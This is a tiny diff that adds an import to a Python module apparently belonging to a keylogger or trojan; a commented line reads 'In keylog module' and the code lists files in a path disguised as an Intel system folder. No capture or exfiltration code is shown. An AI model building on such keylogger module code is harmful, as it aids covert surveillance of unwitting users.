@@ -1,3 +1,5 @@
+import os
+
 def run(**args):
   #print "[*] In keylog module."
   files=os.listdir("C:\\Intel Architecture\\cpu\\")
